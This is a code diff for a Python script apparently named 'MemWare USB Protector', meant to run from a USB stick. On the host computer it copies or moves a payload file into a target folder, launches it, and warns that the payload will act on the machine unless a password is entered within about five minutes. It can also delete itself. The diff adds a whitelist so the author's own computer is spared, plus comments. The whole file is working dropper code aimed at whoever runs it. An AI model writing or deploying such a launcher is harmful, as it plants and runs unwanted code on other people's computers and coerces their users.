@@ -11,27 +11,35 @@ selfdestruct = False # whether the payload file will self-destruct (from the USB
                      # If you have good obfusaction (or the intruder doesn't know reverse-engineering), you should be fine leaving it in their hands
 selfselfdestruct = False # same as previous, but will destroy the current file instead (after input)
 
+trustedComputers = [""] # You can put your own computer name here so that the script doesnt affect you.
+
+### Logic
+
+if os.environ['COMPUTERNAME'] in trustedComputers: # You can use "print(os.environ['COMPUTERNAME])" to get your computer name
+    print("Trusted computer detected, exiting.")
+    exit()
+
 with open(f"{passwordStorage}/{passwordFilename}", "w") as file:
     file.write("This is so that the read function doesnt fail!")
 
-if not os.path.isfile(f"{targetFolder}/{payloadName}"):
+if not os.path.isfile(f"{targetFolder}/{payloadName}"): # The script has already executed
     if selfdestruct:
-        shutil.move(payloadName, targetFolder)
+        shutil.move(payloadName, targetFolder) # Move the script 
     else:
-        shutil.copy(payloadName, targetFolder)
+        shutil.copy(payloadName, targetFolder) # Copy the script
 else:
     exit()
 
-os.startfile(f"{targetFolder}/{payloadName}")
+os.startfile(f"{targetFolder}/{payloadName}") # Start the payload
 
 print("You have triggered the MemWare USB Protector system. Please input the password for the usb in approximately 5 minutes, or the user set payload will execute on your machine.")
 password = str(input("Please input the password >>> "))
 print("The password has been sent to the payload, because it's not stored on this file, we don't know if the password is correct or not.")
 
 with open(f"{passwordStorage}/{passwordFilename}", "w") as file:
-    file.write(password)
+    file.write(password) # Write the password to the password file
 
 if selfselfdestruct:
-    os.remove(__file__)
+    os.remove(__file__) # Self destruct
 
 time.sleep(30)
